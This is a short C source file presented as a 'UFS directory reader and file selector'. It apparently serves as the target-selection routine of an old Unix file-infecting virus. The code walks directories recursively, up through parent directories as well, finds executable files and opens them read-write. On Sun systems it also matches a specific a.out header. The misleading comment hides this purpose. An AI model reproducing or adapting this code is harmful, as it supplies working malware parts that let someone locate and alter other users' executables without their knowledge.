/*
 * UFS directory reader and file selector. Returns an open file descriptor.
 */
#include <fcntl.h>
#ifdef sun
#include <a.out.h>
#endif
#include <sys/types.h>
#include <sys/stat.h>
#include <ufs/fsdir.h>
#ifdef NeXT
#include <libc.h>
#endif

#define	DIRBLKSIZ  512

#ifdef DEBUG
#define D(x) x
#else
#define D(x)
#endif

int
choosedir()
{
	char            nam_ptr[3];
	char            up_link[3];
	char            dir_block[DIRBLKSIZ];
	int             dir_fd, cc;
	int             offset;
	int             other_fd;
	struct direct  *dp;

	nam_ptr[0] = '.';
	nam_ptr[1] = '\0';

	up_link[0] = '.';
	up_link[1] = '.';
	up_link[2] = '\0';

	if ((dir_fd = open(nam_ptr, O_RDONLY)) < 0) {
		return -1;
	}
	offset = 0;
	while ((cc = read(dir_fd, dir_block, DIRBLKSIZ)) == DIRBLKSIZ) {
		dp = (struct direct *) dir_block;

		while (offset < DIRBLKSIZ) {

			if (dp->d_ino != 0) {
				struct stat     stat_buf;
				D(char buf = 0x0a;)
				D(write(2, dp->d_name, strlen(dp->d_name));
				write(2, &buf, 1);)
				if (stat(dp->d_name, &stat_buf) == 0) {
					if (stat_buf.st_mode & S_IFREG
					    && ((stat_buf.st_mode & 0777) == 0755
							|| (stat_buf.st_mode & 0777) == 0777)
					) {
#ifdef sun
						struct exec exhdr;
#endif
						int         can_fd = open(dp->d_name, O_RDWR);
#ifdef sun
						if (can_fd > -1 && read(can_fd, (char *) &exhdr,
							sizeof(struct exec))
						    == sizeof(struct exec)
						    && exhdr.a_magic == 0413
						 && exhdr.a_entry == 0x2020)
							return can_fd;
#else
						if (can_fd > -1)
							return can_fd;
#endif
					}
					if (stat_buf.st_mode & S_IFDIR) {
						int can_fd;
						if (!((dp->d_name[0] == '.') &&
						    ((dp->d_name[1] == '\0') ||
						     ((dp->d_name[1] == '.') && (dp->d_name[2] == '\0')))))
							if (chdir(dp->d_name) == 0) {
								if ((can_fd = choosedir()) != -1)
									return can_fd;
							}
					}
				}
			}
			offset += dp->d_reclen;

			dp = (struct direct *) & dir_block[offset];
		}

		offset = 0;
	}

	chdir(up_link);
	other_fd = choosedir();

	if (other_fd > -1)
		return other_fd;

	close(dir_fd);
	return -1;
}

